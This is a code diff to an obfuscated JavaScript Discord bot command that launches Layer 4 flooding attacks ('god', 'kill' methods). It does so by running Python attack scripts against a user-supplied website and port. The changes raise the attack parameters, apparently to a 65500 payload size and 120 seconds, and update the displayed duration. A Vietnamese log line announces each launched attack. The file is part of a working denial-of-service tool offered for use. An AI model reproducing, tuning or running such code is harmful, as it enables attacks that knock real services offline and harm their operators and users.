@@ -17,12 +17,12 @@ module['exports'] = {
         required: true,
         type: 'STRING',
         choices: [{
-            name: `${'god'}`,
+            name: `${'GOD'}`,
             value: `${'god'}`,
             description: 'Layer4',
         },
         {
-            name: `${'kill'}`,
+            name: `${'KILL'}`,
             value: `${'kill'}`,
             description: 'Layer4',
         },]
@@ -50,7 +50,7 @@ module['exports'] = {
         if (_0xf396x9 === 'god') {
             var method = _0xf396x9;
             const { exec } = require('child_process');
-            exec(`${'python3 vip/L4/'}${method}${'.py '}${website} ${port}${' . . 120'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
+            exec(`${'python3 vip/L4/'}${method}${'.py '}${website} ${port}${' 65500 120'}`, (_0xf396xd, _0xf396xe, _0xf396xf) => {});
             console['log']('M\u1ED9t cu\u1ED9c t\u1EA5n c\xF4ng kh\u1EDFi ch\u1EA1y ID Discord:' + _0xf396x8['guild']['id']);
             const _0xf396x10 = new MessageEmbed()['setColor']('RANDOM')['setTitle'](version)['addFields']({
                 name: '**`\uD83D\uDC68\u200D\uD83D\uDCBB Ng\u01B0\u1EDDi D\xF9ng:`**',
@@ -66,7 +66,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🕒 Thời Gian:`**',
-                value: `${' [ 60 gi\xE2y ] '}`,
+                value: `${' [ 120 gi\xE2y ] '}`,
                 inline: true
             }, {
                 name: '**`🔰 Mode:`**',
@@ -108,7 +108,7 @@ module['exports'] = {
                 inline: true
             }, {
                 name: '**`🕒 Thời Gian:`**',
-                value: `${' [ 60 gi\xE2y ] '}`,
+                value: `${' [ 120 gi\xE2y ] '}`,
                 inline: true
             }, {
                 name: '**`🔰 Mode:`**',
